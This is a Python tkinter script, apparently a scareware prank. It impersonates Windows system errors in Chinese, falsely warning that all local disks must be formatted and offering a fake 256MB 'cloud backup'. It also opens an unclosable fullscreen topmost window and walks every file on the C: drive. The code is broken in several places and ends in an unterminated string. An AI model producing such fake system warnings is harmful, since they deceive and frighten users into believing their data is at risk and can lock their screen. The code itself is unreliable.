import os
import time
import tkinter
from tkinter import *
from tkinter.ttk import *
from tkinter.messagebox import *
#
def on_closing():
    showerror(message="Windows找不到dwm.exe。请从安装程序驱动介质中拷贝或还原该程序。",title="")
def _b():
    root = Tk()
    root.overrideredirect(True)
    root.state('zoomed')
    root.attributes("-topmost", 1)
    root.protocol('WM_DELETE_WINDOW', on_closing)
    root.mainloop()

#
def _x():
    time.sleep(3)
    showerror(message="\"WinSvrUserDataBackup.exe\"使用了0x8DEF2C5A内存，该内存不能为read。",title="WinSvrUserDataBackup.exe - 应用程序错误")
    if askretrycancel(message="用户数据备份失败。",title="")==True:
        _x()
    else:
        pass

#
def _d():
    _dl=[]
    for a,b,c in os.walk("C:\\"):
        for i in c:
            _dl.append(os.path.join(a,i)
    return(dl)

#
def _f():
    _f=Tk()
    __dl=_d()
    
    
#
_fwtdr=Tk()
_fwtdr.withdraw()
showerror(message="Windows预体验版本出现严重问题，需要立即格式化一切本地磁盘以保护您的计算机免受进一步伤害。\n当前已进入安全保护模式，无法读取任何外接驱动器。若要备份您的重要用户数据（仅限256MB以内），请在下一个窗口选择“是”。\n单击“确定”以开始计算机保护进程。",title="Windows严重错误警告")
if askquestion(message="是否将此计算机上的用户数据备份到Windows云端？\n警告：备份空间只有256MB，Windows将自动上传大小最大的文件。其余文件已被冻结，请勿使用。",title="用户数据保护提示")==True:
    _x()
else:
    pass
showwarning(message="计算机保护程序即将启动。请关闭其他正在运行的程序，以防止数据进一步损坏。
       
    

